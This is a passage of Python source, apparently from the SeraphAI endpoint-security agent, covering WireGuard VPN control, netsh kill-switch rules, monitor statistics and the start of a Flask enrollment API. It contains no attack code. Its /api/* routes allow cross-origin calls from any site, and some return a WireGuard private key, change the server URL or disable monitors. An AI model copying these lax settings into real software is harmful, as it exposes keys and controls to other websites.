        except (PermissionError, OSError):
            pass
        return cleaned_mb, cleaned_count

    def _finish_disk_report(self, total_mb: float, total_files: int):
        try:
            disk_now = psutil.disk_usage('/').percent
        except Exception:
            try:
                disk_now = psutil.disk_usage('C:\\').percent
            except Exception:
                disk_now = 0
        msg = f'Cleaned {total_files} files ({total_mb:.1f}MB). Disk now {disk_now:.1f}%'
        self.log_auto_reduce('Disk', 'Cycle complete', msg)
        self.add_event('INFO', f'Auto-reduce Disk: {msg}')

    # --- Settings ---
    def get_settings(self) -> dict:
        cfg = self.agent.config
        return {
            "server_url": cfg.server_url,
            "agent_name": cfg.agent_name,
            "update_interval": cfg.update_interval,
            "heartbeat_interval": cfg.heartbeat_interval,
            "network_scanning": cfg.network_scanning,
            "process_monitoring": cfg.process_monitoring,
            "file_scanning": cfg.file_scanning,
            "wireless_scanning": cfg.wireless_scanning,
            "bluetooth_scanning": cfg.bluetooth_scanning,
        }

    def save_settings(self, settings: dict) -> dict:
        cfg = self.agent.config
        if "server_url" in settings:
            cfg.server_url = settings["server_url"]
        if "agent_name" in settings:
            cfg.agent_name = settings["agent_name"]
        if "update_interval" in settings:
            cfg.update_interval = int(settings["update_interval"])
        if "heartbeat_interval" in settings:
            cfg.heartbeat_interval = int(settings["heartbeat_interval"])
        if "network_scanning" in settings:
            cfg.network_scanning = bool(settings["network_scanning"])
        if "process_monitoring" in settings:
            cfg.process_monitoring = bool(settings["process_monitoring"])
        if "file_scanning" in settings:
            cfg.file_scanning = bool(settings["file_scanning"])
        if "wireless_scanning" in settings:
            cfg.wireless_scanning = bool(settings["wireless_scanning"])
        if "bluetooth_scanning" in settings:
            cfg.bluetooth_scanning = bool(settings["bluetooth_scanning"])
        try:
            self.agent.save_config()
            self.log("Settings saved")
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # --- Logs ---
    def get_logs(self, limit: int = 200) -> list:
        return list(self.logs)[:limit]

    def clear_logs(self) -> dict:
        self.logs.clear()
        return {"success": True}

    def export_logs(self) -> str:
        lines = []
        for entry in reversed(list(self.logs)):
            lines.append(f"[{entry['time']}] [{entry['level']}] {entry['message']}")
        return "\n".join(lines)

    def get_events(self, limit: int = 100) -> list:
        return list(self.events)[:limit]

    def get_auto_reduce_log(self, limit: int = 100) -> list:
        return list(self.auto_reduce_log)[:limit]

    # --- Malware / Virus scanning ---
    def scan_malware(self, custom_paths: list = None) -> dict:
        """Run the agent's heuristic malware scanner."""
        self.add_event("INFO", "Starting virus/malware heuristic scan...")
        self.log("Virus/malware scan started")
        start = time.time()
        try:
            results = self.agent.scan_files_for_malware(path_list=custom_paths)
            elapsed = round(time.time() - start, 2)
            if isinstance(results, list):
                self.add_event(
                    "WARN" if results else "INFO",
                    f"Malware scan done: {len(results)} suspicious file(s) in {elapsed}s"
                )
                return {"success": True, "findings": results, "scan_time": elapsed}
            return {"success": False, "error": str(results), "scan_time": elapsed}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # --- VPN control (proxies to unified server & local WireGuard) ---
    def get_vpn_status(self) -> dict:
        """Get VPN / WireGuard status."""
        preferred_interface = self._vpn_interface_order()[0]
        local_config = self._load_local_vpn_state()
        status = {
            "running": False,
            "interface": preferred_interface,
            "interfaces_checked": self._vpn_interface_order(),
            "config": dict(local_config),
            "error": None,
        }
        # Check local WireGuard
        try:
            result = subprocess.run(['wg', 'show', 'interfaces'], capture_output=True, text=True, timeout=5)
            status["running"] = result.returncode == 0
            if result.returncode == 0:
                interfaces = [i.strip() for i in result.stdout.split() if i.strip()]
                status["active_interfaces"] = interfaces
                if interfaces:
                    status["interface"] = interfaces[0]
                show_detail = subprocess.run(['wg', 'show'], capture_output=True, text=True, timeout=5)
                if show_detail.returncode == 0:
                    status["wg_output"] = show_detail.stdout[:500]
        except FileNotFoundError:
            status["error"] = "WireGuard not installed"
        except Exception as e:
            status["error"] = str(e)
        # Try getting config from unified server
        try:
            server_url = self.agent.config.server_url
            if _requests and server_url:
                resp = _requests.get(f"{server_url}/api/vpn/status", timeout=5)
                if resp.status_code == 200:
                    server_status = resp.json()
                    remote_config = server_status.get("config", {}) if isinstance(server_status, dict) else {}
                    if isinstance(remote_config, dict):
                        status["config"].update({
                            "enabled": remote_config.get("enabled", status["config"].get("enabled", True)),
                            "port": remote_config.get("port", status["config"].get("port", 51820)),
                            "dns_servers": remote_config.get("dns_servers", remote_config.get("dns", status["config"].get("dns_servers", []))),
                            "type": remote_config.get("type", status["config"].get("type", "wireguard")),
                        })
                    status["clients_connected"] = server_status.get(
                        "clients_connected",
                        len(server_status.get("peers", []) or []),
                    )
                    server_block = server_status.get("server", {}) if isinstance(server_status, dict) else {}
                    status["server_address"] = (
                        server_status.get("server_address")
                        or server_block.get("address")
                        or status["config"].get("server_address", "")
                    )
                    status["port"] = status["config"].get("port", 51820)
        except Exception:
            pass

        # Include monolithic agent VPN status for canonical parity.
        if self.monolithic_agent is not None:
            try:
                status["agent_vpn"] = self.monolithic_agent.get_vpn_status()
            except Exception as e:
                status["agent_vpn_error"] = str(e)
        return status

    def get_vpn_clients(self) -> list:
        """Get VPN client list from unified server."""
        try:
            server_url = self.agent.config.server_url
            if _requests and server_url:
                resp = _requests.get(f"{server_url}/api/vpn/clients", timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    return data.get("clients", [])
                resp = _requests.get(f"{server_url}/api/vpn/peers", timeout=5)
                if resp.status_code == 200:
                    data = resp.json()
                    peers = data.get("peers", []) if isinstance(data, dict) else []
                    return [
                        {
                            "client_id": peer.get("peer_id") or peer.get("id") or peer.get("name"),
                            "name": peer.get("name"),
                            "ip_address": str(peer.get("allowed_ips", "")).split("/")[0],
                            "status": peer.get("status", "active"),
                            "public_key": peer.get("public_key", ""),
                        }
                        for peer in peers
                        if isinstance(peer, dict)
                    ]
        except Exception:
            pass
        return []

    def vpn_start(self) -> dict:
        """Start WireGuard VPN tunnel."""
        try:
            if self.monolithic_agent is not None:
                vpn = getattr(self.monolithic_agent, "vpn", None)
                if vpn is not None:
                    if getattr(vpn, "is_connected", False):
                        return {"success": True, "message": "VPN already connected"}
                    if getattr(self.monolithic_agent.config, "server_url", "") and getattr(self.monolithic_agent.config, "vpn_auto_configure", False):
                        configured = vpn.auto_configure()
                        if configured:
                            if getattr(vpn, "is_connected", False):
                                return {"success": True, "message": "VPN configured and started automatically"}
                            return {"success": True, "message": "VPN configured automatically; start may require admin rights"}

            if platform.system() == "Windows":
                # Try Windows WireGuard service
                result = None
                for iface in self._vpn_interface_order():
                    result = subprocess.run(
                        ['sc', 'start', f'WireGuardTunnel${iface}'],
                        capture_output=True, text=True, timeout=15
                    )
                    if result.returncode == 0:
                        break
                if result.returncode != 0:
                    # Try wireguard.exe /installtunnelservice
                    wg_exe = r"C:\Program Files\WireGuard\wireguard.exe"
                    conf_candidates = [
                        r"C:\Program Files\WireGuard\Data\Configurations\metatron-vpn.conf",
                        r"C:\Program Files\WireGuard\Data\Configurations\wg0.conf",
                        os.path.expanduser(r"~\metatron-vpn.conf"),
                        os.path.expanduser(r"~\wg0.conf"),
                    ]
                    for conf in conf_candidates:
                        if os.path.exists(conf):
                            result = subprocess.run(
                                [wg_exe, '/installtunnelservice', conf],
                                capture_output=True, text=True, timeout=15
                            )
                            break
                    else:
                        return {"success": False, "error": "No WireGuard config found. Place metatron-vpn.conf or wg0.conf in WireGuard Data folder."}
            else:
                # Try interface candidates in stable preferred order.
                result = None
                for iface in self._vpn_interface_order():
                    result = subprocess.run(['wg-quick', 'up', iface], capture_output=True, text=True, timeout=15)
                    if result.returncode == 0:
                        break

            # If shell path fails but monolithic core is available, use its VPN setup/start path.
            if result.returncode != 0 and self.monolithic_agent is not None:
                configured = self.monolithic_agent.vpn.auto_configure()
                if configured and self.monolithic_agent.vpn.get_status().get("configured"):
                    return {"success": True, "message": "VPN configured via monolithic core"}

            msg = (result.stdout + result.stderr).strip()[:200]
            if result.returncode == 0 or 'already exists' in msg.lower():
                self.add_event("INFO", "VPN tunnel started")
                self.log("VPN started")
                return {"success": True, "message": "VPN started"}
            msg_lower = (msg or "").lower()
            if any(token in msg_lower for token in ("access is denied", "permission denied", "operation not permitted", "requires elevation")):
                return {
                    "success": False,
                    "error": (
                        "Administrative privileges are required to start a WireGuard tunnel on this host. "
                        "Run the local agent as Administrator/root, or import the generated config into the WireGuard app "
                        "and activate the tunnel manually."
                    ),
                    "detail": msg or "permission denied",
                }
            return {"success": False, "error": msg or "Start failed"}
        except FileNotFoundError:
            return {"success": False, "error": "WireGuard not installed"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def vpn_stop(self) -> dict:
        """Stop WireGuard VPN tunnel."""
        try:
            if platform.system() == "Windows":
                result = None
                for iface in self._vpn_interface_order():
                    result = subprocess.run(
                        ['sc', 'stop', f'WireGuardTunnel${iface}'],
                        capture_output=True, text=True, timeout=15
                    )
                    if result.returncode == 0:
                        break
                if result.returncode != 0:
                    wg_exe = r"C:\Program Files\WireGuard\wireguard.exe"
                    for iface in self._vpn_interface_order():
                        result = subprocess.run(
                            [wg_exe, '/uninstalltunnelservice', iface],
                            capture_output=True, text=True, timeout=15
                        )
                        if result.returncode == 0:
                            break
            else:
                # Try all interface candidates for compatibility with existing deployments.
                result = None
                for iface in self._vpn_interface_order():
                    result = subprocess.run(['wg-quick', 'down', iface], capture_output=True, text=True, timeout=15)
                    if result.returncode == 0:
                        break

            if result.returncode != 0 and self.monolithic_agent is not None:
                self.monolithic_agent.vpn.stop_vpn()
                return {"success": True, "message": "VPN stop requested via monolithic core"}

            msg = (result.stdout + result.stderr).strip()[:200]
            if result.returncode == 0 or 'not found' in msg.lower():
                self.add_event("INFO", "VPN tunnel stopped")
                self.log("VPN stopped")
                return {"success": True, "message": "VPN stopped"}
            return {"success": False, "error": msg or "Stop failed"}
        except FileNotFoundError:
            return {"success": False, "error": "WireGuard not installed"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def vpn_generate_keys(self) -> dict:
        """Generate WireGuard key pair."""
        try:
            priv = subprocess.run(['wg', 'genkey'], capture_output=True, text=True, check=True, timeout=5)
            private_key = priv.stdout.strip()
            pub = subprocess.run(['wg', 'pubkey'], input=private_key, capture_output=True, text=True, check=True, timeout=5)
            public_key = pub.stdout.strip()
            return {"success": True, "private_key": private_key, "public_key": public_key}
        except FileNotFoundError:
            return {"success": False, "error": "WireGuard tools not installed"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def vpn_update_config(self, config: dict) -> dict:
        """Update VPN config with local persistence and best-effort remote sync."""
        try:
            saved_config = self._save_local_vpn_state(config or {})
            server_url = self.agent.config.server_url
            if _requests and server_url:
                try:
                    resp = _requests.put(f"{server_url}/api/vpn/config", json=saved_config, timeout=10)
                    if resp.status_code == 200:
                        payload = resp.json()
                        if isinstance(payload, dict):
                            payload.setdefault("config", saved_config)
                            payload.setdefault("status", "updated")
                            payload.setdefault("persisted", "remote")
                            return payload
                except Exception as e:
                    logger.debug(f"Remote VPN config sync failed; keeping local state only: {e}")
            return {"success": True, "status": "updated", "config": saved_config, "persisted": "local"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def vpn_kill_switch(self, enabled: bool) -> dict:
        """Toggle kill switch — block all non-VPN traffic via firewall."""
        try:
            if enabled:
                # Add firewall rules to block non-WireGuard traffic
                cmds = [
                    ['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                     'name=SeraphAI-KillSwitch-Block', 'dir=out', 'action=block',
                     'protocol=any', 'enable=yes'],
                    ['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                     'name=SeraphAI-KillSwitch-AllowWG', 'dir=out', 'action=allow',
                     'protocol=udp', 'remoteport=51820', 'enable=yes'],
                    ['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                     'name=SeraphAI-KillSwitch-AllowLocal', 'dir=out', 'action=allow',
                     'remoteip=10.0.0.0/8,172.16.0.0/12,192.168.0.0/16,127.0.0.0/8',
                     'enable=yes'],
                ]
                for cmd in cmds:
                    subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                self.add_event("INFO", "VPN Kill Switch ENABLED")
            else:
                # Remove kill switch rules
                for name in ['SeraphAI-KillSwitch-Block', 'SeraphAI-KillSwitch-AllowWG', 'SeraphAI-KillSwitch-AllowLocal']:
                    subprocess.run(
                        ['netsh', 'advfirewall', 'firewall', 'delete', 'rule', f'name={name}'],
                        capture_output=True, text=True, timeout=10
                    )
                self.add_event("INFO", "VPN Kill Switch DISABLED")
            return {"success": True, "enabled": enabled}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # =========================================================================
    # MONITOR STATS - Expose all 17 MonitorModule stats locally
    # =========================================================================

    def get_all_monitor_stats(self) -> dict:
        """Get aggregated stats from all monitors."""
        source_agent = self.monolithic_agent if self.monolithic_agent is not None else self.agent
        threat_history = getattr(source_agent, 'threat_history', [])
        event_log = getattr(source_agent, 'event_log', [])

        stats = {
            "monitors": {},
            "summary": {
                "total_monitors": len(self._monitors()),
                "active_monitors": sum(1 for m in self._monitors().values() if m.enabled),
                "total_threats": len(threat_history),
                "total_events": len(event_log),
            }
        }
        for name, monitor in self._monitors().items():
            stats["monitors"][name] = {
                "enabled": monitor.enabled,
                "stats": getattr(monitor, 'stats', {}),
                "last_scan": getattr(monitor, 'last_scan', None),
            }
        return stats

    def get_monitor_stats(self, monitor_name: str) -> dict:
        """Get stats for a specific monitor."""
        if monitor_name == "trusted-ai":
            return self.get_trusted_ai_stats()
        if monitor_name == "power":
            return self.get_power_stats()
        if monitor_name == "usb":
            cached = self._last_usb_scan_result or {"success": True, "devices": [], "scan_time": 0.0}
            return {
                "name": "usb",
                "enabled": str(os.environ.get("SERAPH_AGENT_USB_MONITORING", "true")).lower() in {"1", "true", "yes", "on"},
                "connected_devices": cached.get("devices", []),
                "blocked_devices": [],
                "last_scan_time": cached.get("scan_time", 0.0),
                "success": cached.get("success", True),
            }

        resolved_name = self._resolve_monitor_name(monitor_name)
        if resolved_name not in self._monitors():
            return {"error": f"Monitor '{monitor_name}' not found", "available": list(self._monitors().keys())}
        monitor = self._monitors()[resolved_name]
        return {
            "name": resolved_name,
            "enabled": monitor.enabled,
            "stats": getattr(monitor, 'stats', {}),
            "last_scan": getattr(monitor, 'last_scan', None),
            "alerts": getattr(monitor, 'alerts', [])[-50:] if hasattr(monitor, 'alerts') else [],
        }

    def get_amsi_stats(self) -> dict:
        """Get AMSI monitor stats when available (Windows)."""
        if 'amsi' not in self._monitors():
            return {"enabled": False, "unsupported": True, "reason": "AMSI monitor not available on this platform"}
        mon = self._monitors()['amsi']
        return {
            "enabled": mon.enabled,
            "bypass_attempts": getattr(mon, 'bypass_attempts', []),
            "obfuscation_detected": getattr(mon, 'obfuscation_detected', []),
            "stats": getattr(mon, 'stats', {}),
        }

    def get_webview_stats(self) -> dict:
        """Get WebView2 monitor stats when available (Windows)."""
        if 'webview2' not in self._monitors():
            return {"enabled": False, "unsupported": True, "reason": "WebView2 monitor not available on this platform"}
        mon = self._monitors()['webview2']
        return {
            "enabled": mon.enabled,
            "embedded_browsers": getattr(mon, 'embedded_browsers', []),
            "script_blocks": getattr(mon, 'script_blocks', []),
            "stats": getattr(mon, 'stats', {}),
        }

    def get_trusted_ai_stats(self) -> dict:
        """Expose trusted-AI visibility using process monitor data as the source of truth."""
        proc_mon = self._monitors().get('process')
        if proc_mon is None:
            return {"enabled": False, "allowed_count": 0, "blocked_ai": [], "reason": "Process monitor not initialized"}

        process_rows = getattr(proc_mon, 'processes', []) or []
        allowed = [p for p in process_rows if p.get('trusted_ai')]
        blocked = []
        for p in process_rows:
            indicators = p.get('threat_indicators') or []
            if any('ai' in str(i).lower() for i in indicators):
                blocked.append({
                    "pid": p.get("pid"),
                    "name": p.get("name"),
                    "risk_score": p.get("risk_score", 0),
                })

        return {
            "enabled": bool(getattr(proc_mon, 'enabled', True)),
            "allowed_count": len(allowed),
            "blocked_ai": blocked,
        }

    def get_power_stats(self) -> dict:
        """Expose power-management telemetry derived from host battery state."""
        wake_events: List[Dict[str, Any]] = []
        sleep_blocked: List[Dict[str, Any]] = []

        if psutil and hasattr(psutil, 'sensors_battery'):
            try:
                battery = psutil.sensors_battery()
                if battery is not None and bool(getattr(battery, 'power_plugged', False)):
                    wake_events.append({"source": "ac_power", "at": datetime.now(timezone.utc).isoformat()})
            except Exception:
                pass

        return {
            "enabled": True,
            "sleep_blocked": sleep_blocked,
            "wake_events": wake_events,
        }

    def _get_tool_monitor_stats(self, tool_name: str) -> dict:
        """Build monitor-style status payload for tooling cards."""
        tooling = self.get_security_tooling_status()
        tool = (tooling.get("tools") or {}).get(tool_name, {})
        installed = bool(tool.get("installed"))
        container_running = bool(tool.get("container_running"))
        return {
            "enabled": True,
            "tool": tool_name,
            "installed": installed,
            "container_running": container_running,
            "ready": installed or container_running,
            "command": tool.get("command"),
            "path": tool.get("path"),
            "container": tool.get("container"),
            "checked_at": tooling.get("checked_at"),
        }

    def get_trivy_monitor_stats(self) -> dict:
        return self._get_tool_monitor_stats("trivy")

    def get_falco_monitor_stats(self) -> dict:
        return self._get_tool_monitor_stats("falco")

    def get_suricata_monitor_stats(self) -> dict:
        return self._get_tool_monitor_stats("suricata")

    def get_volatility_monitor_stats(self) -> dict:
        return self._get_tool_monitor_stats("volatility")

    def get_ransomware_stats(self) -> dict:
        """Get ransomware protection monitor stats."""
        if 'ransomware' not in self._monitors():
            return {"enabled": False, "error": "Ransomware monitor not initialized"}
        mon = self._monitors()['ransomware']
        scan_result = {}
        status_payload = {}
        try:
            scan_result = mon.scan() or {}
        except Exception as e:
            logger.debug(f"Ransomware stats refresh failed: {e}")
        try:
            status_payload = mon.get_status() or {}
        except Exception:
            status_payload = {}
        canary_paths = list(status_payload.get('canary_paths') or getattr(mon, 'canaries', {}).keys())
        return {
            "enabled": mon.enabled,
            "canary_files": canary_paths,
            "canary_alerts": int(scan_result.get('canary_alerts', 0) or 0),
            "protected_folders": list(status_payload.get('protected_folders') or getattr(mon, 'protected_folders', [])),
            "protected_extensions": [],
            "shadow_copy_protected": status_payload.get('shadow_copy_baseline') is not None,
            "stats": scan_result or status_payload,
        }

    def get_rootkit_stats(self) -> dict:
        """Get rootkit detector stats."""
        if 'rootkit' not in self._monitors():
            return {"enabled": False, "error": "Rootkit detector not initialized"}
        mon = self._monitors()['rootkit']
        return {
            "enabled": mon.enabled,
            "hidden_processes": getattr(mon, 'hidden_processes', []),
            "suspicious_modules": getattr(mon, 'suspicious_modules', []),
            "ld_preload_hooks": getattr(mon, 'ld_preload_hooks', []),
            "dkom_indicators": getattr(mon, 'dkom_indicators', []),
            "integrity_violations": getattr(mon, 'integrity_violations', []),
            "stats": getattr(mon, 'stats', {}),
        }

    def get_kernel_stats(self) -> dict:
        """Get kernel security monitor stats."""
        if 'kernel_security' not in self._monitors():
            return {"enabled": False, "error": "Kernel security monitor not initialized"}
        mon = self._monitors()['kernel_security']
        return {
            "enabled": mon.enabled,
            "syscall_anomalies": getattr(mon, 'syscall_anomalies', []),
            "audit_alerts": getattr(mon, 'audit_alerts', []),
            "ptrace_detections": getattr(mon, 'ptrace_detections', []),
            "privilege_escalations": getattr(mon, 'privilege_escalations', []),
            "stats": getattr(mon, 'stats', {}),
        }

    def get_self_protection_stats(self) -> dict:
        """Get agent self-protection stats."""
        if 'self_protection' not in self._monitors():
            return {"enabled": False, "error": "Self-protection monitor not initialized"}
        mon = self._monitors()['self_protection']
        scan_result = {}
        try:
            scan_result = mon.scan() or {}
        except Exception as e:
            logger.debug(f"Self-protection stats refresh failed: {e}")
        protection_status = scan_result.get('protection_status', {}) if isinstance(scan_result, dict) else {}
        details = scan_result.get('details', {}) if isinstance(scan_result, dict) else {}
        tamper_events = list(details.get('tamper_events') or [])
        injection_attempts = [
            event for event in tamper_events
            if str(event.get('type') or '') in {'suspicious_library', 'rwx_memory_region'}
        ]
        return {
            "enabled": mon.enabled,
            "anti_debug_active": bool(protection_status.get('not_debugged', True)),
            "watchdog_running": bool(getattr(mon, 'watchdog_enabled', False)),
            "debugger_detections": list(details.get('debug_attempts') or []),
            "injection_attempts": injection_attempts,
            "integrity_status": {
                "process_intact": protection_status.get('process_intact', False),
                "files_intact": protection_status.get('files_intact', False),
                "parent_valid": protection_status.get('parent_valid', False),
            },
            "stats": scan_result,
        }

    def get_identity_stats(self) -> dict:
        """Get identity protection stats."""
        if 'identity' not in self._monitors():
            return {"enabled": False, "error": "Identity protection monitor not initialized"}
        mon = self._monitors()['identity']
        return {
            "enabled": mon.enabled,
            "credential_tools_detected": getattr(mon, 'credential_tools_detected', []),
            "lsass_access_alerts": getattr(mon, 'lsass_access_alerts', []),
            "browser_credential_alerts": getattr(mon, 'browser_credential_alerts', []),
            "pth_indicators": getattr(mon, 'pth_indicators', []),
            "kerberos_anomalies": getattr(mon, 'kerberos_anomalies', []),
            "stats": getattr(mon, 'stats', {}),
        }

    def get_process_tree_stats(self) -> dict:
        """Get process tree monitor stats."""
        if 'process_tree' not in self._monitors():
            return {"enabled": False, "error": "Process tree monitor not initialized"}
        mon = self._monitors()['process_tree']
        return {
            "enabled": mon.enabled,
            "suspicious_chains": getattr(mon, 'suspicious_chains', []),
            "injection_detections": getattr(mon, 'injection_detections', []),
            "stats": getattr(mon, 'stats', {}),
        }

    def get_lolbin_stats(self) -> dict:
        """Get LOLBin monitor stats."""
        if 'lolbin' not in self._monitors():
            return {"enabled": False, "error": "LOLBin monitor not initialized"}
        mon = self._monitors()['lolbin']
        return {
            "enabled": mon.enabled,
            "lolbin_executions": getattr(mon, 'lolbin_executions', []),
            "stats": getattr(mon, 'stats', {}),
        }

    def get_dns_stats(self) -> dict:
        """Get DNS monitor stats."""
        if 'dns' not in self._monitors():
            return {"enabled": False, "error": "DNS monitor not initialized"}
        mon = self._monitors()['dns']
        return {
            "enabled": mon.enabled,
            "dns_anomalies": getattr(mon, 'dns_anomalies', []),
            "dga_detections": getattr(mon, 'dga_detections', []),
            "dns_tunneling_alerts": getattr(mon, 'dns_tunneling_alerts', []),
            "stats": getattr(mon, 'stats', {}),
        }

    def get_memory_stats(self) -> dict:
        """Get memory scanner stats."""
        if 'memory' not in self._monitors():
            return {"enabled": False, "error": "Memory scanner not initialized"}
        mon = self._monitors()['memory']
        return {
            "enabled": mon.enabled,
            "injections_detected": getattr(mon, 'injections_detected', []),
            "reflective_loads": getattr(mon, 'reflective_loads', []),
            "stats": getattr(mon, 'stats', {}),
        }

    def get_dlp_stats(self) -> dict:
        """Get DLP monitor stats."""
        if 'dlp' not in self._monitors():
            return {"enabled": False, "error": "DLP monitor not initialized"}
        mon = self._monitors()['dlp']
        return {
            "enabled": mon.enabled,
            "sensitive_data_alerts": getattr(mon, 'sensitive_data_alerts', []),
            "exfiltration_attempts": getattr(mon, 'exfiltration_attempts', []),
            "stats": getattr(mon, 'stats', {}),
        }

    def get_vulnerability_stats(self) -> dict:
        """Get vulnerability scanner stats."""
        if 'vulnerability' not in self._monitors():
            return {"enabled": False, "error": "Vulnerability scanner not initialized"}
        mon = self._monitors()['vulnerability']
        return {
            "enabled": mon.enabled,
            "vulnerabilities": getattr(mon, 'vulnerabilities', []),
            "cve_matches": getattr(mon, 'cve_matches', []),
            "stats": getattr(mon, 'stats', {}),
        }

    def get_whitelist_stats(self) -> dict:
        """Get application whitelist stats."""
        if 'whitelist' not in self._monitors():
            return {"enabled": False, "error": "Whitelist monitor not initialized"}
        mon = self._monitors()['whitelist']
        return {
            "enabled": mon.enabled,
            "blocked_applications": getattr(mon, 'blocked_applications', []),
            "allowed_list": getattr(mon, 'allowed_list', []),
            "stats": getattr(mon, 'stats', {}),
        }

    def get_code_signing_stats(self) -> dict:
        """Get code signing monitor stats."""
        if 'code_signing' not in self._monitors():
            return {"enabled": False, "error": "Code signing monitor not initialized"}
        mon = self._monitors()['code_signing']
        return {
            "enabled": mon.enabled,
            "unsigned_executions": getattr(mon, 'unsigned_executions', []),
            "invalid_signatures": getattr(mon, 'invalid_signatures', []),
            "stats": getattr(mon, 'stats', {}),
        }

    def get_email_protection_stats(self) -> dict:
        """Get email protection monitor stats."""
        if 'email_protection' not in self._monitors():
            return {"enabled": False, "error": "Email protection monitor not initialized"}
        mon = self._monitors()['email_protection']
        return mon.get_status() if hasattr(mon, 'get_status') else {
            "enabled": mon.enabled,
            "emails_scanned": getattr(mon, 'emails_scanned', 0),
            "phishing_detected": getattr(mon, 'phishing_detected', 0),
            "malicious_attachments": getattr(mon, 'malicious_attachments', 0),
            "suspicious_urls": getattr(mon, 'suspicious_urls', 0),
            "stats": getattr(mon, 'stats', {}),
        }

    def analyze_url(self, url: str) -> dict:
        """Analyze a URL for phishing indicators."""
        if 'email_protection' not in self._monitors():
            return {"error": "Email protection monitor not available"}
        mon = self._monitors()['email_protection']
        if hasattr(mon, 'analyze_url'):
            return mon.analyze_url(url)
        return {"error": "URL analysis not available"}

    def analyze_email_content(self, content: str) -> dict:
        """Analyze email content for phishing indicators."""
        if 'email_protection' not in self._monitors():
            return {"error": "Email protection monitor not available"}
        mon = self._monitors()['email_protection']
        if hasattr(mon, 'analyze_content'):
            return mon.analyze_content(content)
        return {"error": "Content analysis not available"}

    def get_mobile_security_stats(self) -> dict:
        """Get mobile security monitor stats."""
        if 'mobile_security' not in self._monitors():
            return {"enabled": False, "error": "Mobile security monitor not initialized"}
        mon = self._monitors()['mobile_security']
        return mon.get_status() if hasattr(mon, 'get_status') else {
            "enabled": mon.enabled,
            "device_info": getattr(mon, 'device_info', {}),
            "threats_detected": getattr(mon, 'threats_detected', 0),
            "compliance_score": getattr(mon, 'compliance_score', 100.0),
            "compliance_checks": getattr(mon, 'compliance_checks', {}),
        }

    def analyze_app(self, app_name: str, package_name: str = '', permissions: list = None) -> dict:
        """Analyze an app for security issues."""
        if 'mobile_security' not in self._monitors():
            return {"error": "Mobile security monitor not available"}
        mon = self._monitors()['mobile_security']
        if hasattr(mon, 'analyze_app'):
            return mon.analyze_app(app_name, package_name, permissions or [])
        return {"error": "App analysis not available"}

    def toggle_monitor(self, monitor_name: str, enabled: bool) -> dict:
        """Enable or disable a specific monitor."""
        resolved_name = self._resolve_monitor_name(monitor_name)
        if resolved_name not in self._monitors():
            return {"success": False, "error": f"Monitor '{monitor_name}' not found"}
        self._monitors()[resolved_name].enabled = enabled
        self.log(f"Monitor '{resolved_name}' {'enabled' if enabled else 'disabled'}")
        return {"success": True, "monitor": resolved_name, "enabled": enabled}


# ============================================================================
# Flask Application
# ============================================================================

def create_app() -> Flask:
    """Create and configure the Flask app."""
    template_dir = Path(__file__).resolve().parent / "templates"
    app = Flask(__name__, template_folder=str(template_dir))
    CORS(
        app,
        resources={r"/api/*": {"origins": "*"}},
        allow_headers=["Authorization", "Content-Type", "X-Requested-With"],
        expose_headers=["Content-Type"],
    )

    @app.after_request
    def _set_response_security_headers(resp):
        # Keep dashboard dependencies loadable on both :3000 and :5000 surfaces.
        csp = (
            "default-src 'self' data: blob: https:; "
            "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.tailwindcss.com https://cdn.jsdelivr.net; "
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
            "font-src 'self' https://fonts.gstatic.com data:; "
            "img-src 'self' data: blob: https:; "
            "connect-src 'self' http: https: ws: wss:;"
        )
        resp.headers.setdefault("Content-Security-Policy", csp)
        resp.headers.setdefault("X-Content-Type-Options", "nosniff")
        resp.headers.setdefault("Referrer-Policy", "strict-origin-when-cross-origin")
        return resp

    # Single global agent bridge
    bridge = WebAgentBridge()

    def _resolve_public_base_url() -> str:
        """Resolve the canonical enrollment base URL for install links and docs."""
        configured = os.environ.get("SERAPH_PUBLIC_URL", "").strip().rstrip("/")
        if configured:
            return configured
        forwarded_host = request.headers.get("X-Forwarded-Host", "").strip()
        forwarded_proto = request.headers.get("X-Forwarded-Proto", "").strip() or "https"
        host = forwarded_host or request.headers.get("Host", "").strip() or "localhost:5000"
        if host.startswith("seraphai.com") or host.startswith("www.seraphai.com"):
            return f"{forwarded_proto}://{host}"
        return f"{forwarded_proto}://seraphai.com"

    def _resolve_enrollment_token() -> str:
        """Pull invite token from the request when present."""
        token = (
            request.args.get("token")
            or request.args.get("invite_token")
            or request.args.get("enrollment_token")
            or request.headers.get("X-Enrollment-Token")
            or request.headers.get("X-Invite-Token")
            or ""
        ).strip()
        return token

    def _with_optional_token(url: str, token: str) -> str:
        if not token:
            return url
        separator = "&" if "?" in url else "?"
        return f"{url}{separator}token={token}"

    # ------------------------------------------------------------------
    # Page routes
    # ------------------------------------------------------------------
    @app.route("/")
    def index():
        return render_template("dashboard.html")

    @app.route("/enroll")
    def enroll():
        if os.environ.get("SERAPH_LOCAL_ENROLL_ENABLED", "false").lower() != "true":
            configured = os.environ.get("SERAPH_ENROLLMENT_URL", "").strip()
            if configured:
                return redirect(configured, code=302)
            host = request.headers.get("Host", "localhost:5000").split(":")[0] or "localhost"
            proto = request.headers.get("X-Forwarded-Proto", request.scheme or "http")
            target_port = os.environ.get("SERAPH_ENROLLMENT_PORT", "3000")
            return redirect(f"{proto}://{host}:{target_port}/enroll", code=302)
        return render_template("enroll.html", public_base_url=_resolve_public_base_url(), invite_token=_resolve_enrollment_token())

    # ------------------------------------------------------------------
    # Enrollment API — called by the enroll page
    # ------------------------------------------------------------------
    @app.route("/api/enroll/register", methods=["POST"])
    def api_enroll_register():
        """Accept a self-registration from any device, save it, return install instructions."""
        import re as _re
        data = request.get_json(force=True) or {}

        name     = str(data.get("name", "")).strip()[:80]
        email    = str(data.get("email", "")).strip()[:120]
        device_label = str(data.get("device_label", "")).strip()[:80]
        platform_hint = str(data.get("platform", "")).strip().lower()  # supplied by JS UA detection

        if not name or not email:
